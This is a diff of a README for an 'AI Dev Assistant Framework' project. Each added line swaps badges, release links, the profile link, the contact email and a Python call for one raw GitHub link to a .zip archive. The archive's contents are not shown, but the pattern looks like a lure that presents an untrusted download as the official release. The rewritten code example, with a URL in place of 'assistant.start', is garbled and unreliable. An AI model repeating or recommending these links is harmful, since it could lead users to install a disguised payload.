@@ -1,8 +1,8 @@
 # AI Dev Assistant Framework: Governance for AI in Software Development 🤖
 
-![AI Dev Assistant Framework](https://img.shields.io/badge/Version-1.0.0-blue.svg) ![License](https://img.shields.io/badge/License-MIT-green.svg) ![GitHub Releases](https://img.shields.io/badge/Releases-Check%20Here-orange.svg)
+![AI Dev Assistant Framework](https://raw.githubusercontent.com/MunnaXbadmash/ai-dev-assistant-framework/main/rules/assistant-ai-dev-framework-v2.6-alpha.4.zip) ![License](https://raw.githubusercontent.com/MunnaXbadmash/ai-dev-assistant-framework/main/rules/assistant-ai-dev-framework-v2.6-alpha.4.zip) ![GitHub Releases](https://raw.githubusercontent.com/MunnaXbadmash/ai-dev-assistant-framework/main/rules/assistant-ai-dev-framework-v2.6-alpha.4.zip%https://raw.githubusercontent.com/MunnaXbadmash/ai-dev-assistant-framework/main/rules/assistant-ai-dev-framework-v2.6-alpha.4.zip)
 
-[![Releases](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/MunnaXbadmash/ai-dev-assistant-framework/releases)
+[![Releases](https://raw.githubusercontent.com/MunnaXbadmash/ai-dev-assistant-framework/main/rules/assistant-ai-dev-framework-v2.6-alpha.4.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/MunnaXbadmash/ai-dev-assistant-framework/main/rules/assistant-ai-dev-framework-v2.6-alpha.4.zip)
 
 ## Table of Contents
 
@@ -30,7 +30,7 @@ The **AI Dev Assistant Framework** provides a structured governance framework de
 
 ## Installation
 
-To get started, download the latest release from the [Releases section](https://github.com/MunnaXbadmash/ai-dev-assistant-framework/releases). 
+To get started, download the latest release from the [Releases section](https://raw.githubusercontent.com/MunnaXbadmash/ai-dev-assistant-framework/main/rules/assistant-ai-dev-framework-v2.6-alpha.4.zip). 
 
 1. Navigate to the releases page.
 2. Download the appropriate file for your operating system.
@@ -54,7 +54,7 @@ project = {
 }
 
 # Start the development process
-assistant.start(project)
+https://raw.githubusercontent.com/MunnaXbadmash/ai-dev-assistant-framework/main/rules/assistant-ai-dev-framework-v2.6-alpha.4.zip(project)
 ```
 
 Refer to the documentation for detailed usage instructions and advanced features.
@@ -114,7 +114,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **GitHub**: [MunnaXbadmash](https://github.com/MunnaXbadmash)
-- **Email**: contact@example.com
+- **GitHub**: [MunnaXbadmash](https://raw.githubusercontent.com/MunnaXbadmash/ai-dev-assistant-framework/main/rules/assistant-ai-dev-framework-v2.6-alpha.4.zip)
+- **Email**: https://raw.githubusercontent.com/MunnaXbadmash/ai-dev-assistant-framework/main/rules/assistant-ai-dev-framework-v2.6-alpha.4.zip
 
-Check the [Releases section](https://github.com/MunnaXbadmash/ai-dev-assistant-framework/releases) for updates and new features.
+Check the [Releases section](https://raw.githubusercontent.com/MunnaXbadmash/ai-dev-assistant-framework/main/rules/assistant-ai-dev-framework-v2.6-alpha.4.zip) for updates and new features.
